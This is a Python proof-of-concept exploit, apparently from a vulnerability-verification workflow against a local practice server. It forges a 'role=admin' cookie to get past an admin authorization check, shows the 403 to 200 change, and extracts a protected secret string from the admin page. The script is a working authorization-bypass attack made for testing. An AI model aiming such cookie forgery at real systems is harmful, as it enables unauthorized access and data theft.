#!/usr/bin/env python3
"""PoC (proven-live step, F-1): full admin takeover with asset extraction.

Stronger than poc1_admin_cookie_forge.py: not only does the forged cookie
flip the privilege gate, the exploit EXTRACTS the protected asset (the
"internal transfer keys" secret) and demonstrates a clean 403->200
privilege differential attributable solely to the single forged header.
EDUCATIONAL - run against the local practice target only.
Ladder  : in-code -> proven-live (this file). Exit 0 = reproduced.
"""
import re
import sys
import urllib.request

BASE = "http://127.0.0.1:8765"
SECRET = "SECRET: internal transfer keys"


def get(path: str, cookie: str = "") -> tuple[int, str]:
    req = urllib.request.Request(BASE + path)
    if cookie:
        req.add_header("Cookie", cookie)
    try:
        with urllib.request.urlopen(req) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def main() -> int:
    # 1. privilege differential: identical request, one header changed
    code_user, _ = get("/admin", "role=user")
    code_admin, body = get("/admin", "role=admin")
    print(f"[differential] role=user  -> HTTP {code_user} (denied)")
    print(f"[differential] role=admin -> HTTP {code_admin} (granted)")

    # 2. asset extraction: pull the protected string out of the admin body
    m = re.search(r"<p>(SECRET:[^<]+)</p>", body)
    extracted = m.group(1) if m else None
    print(f"[extraction] protected asset recovered from admin panel: {extracted!r}")

    # 3. takeover is stable: repeat request is still granted (no session churn)
    code_again, _ = get("/admin", "role=admin")
    print(f"[stability] repeat forged request -> HTTP {code_again}")

    ok = (
        code_user == 403
        and code_admin == 200
        and extracted == SECRET
        and code_again == 200
    )
    if not ok:
        print("FAIL: full takeover not reproduced")
        return 1
    print("REPRODUCED: one forged header = admin takeover + protected asset extracted")
    print("--- transcript (extraction) ---")
    print(f"GET /admin HTTP/1.1\nCookie: role=admin\n\nHTTP/1.0 200 OK\n{extracted}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
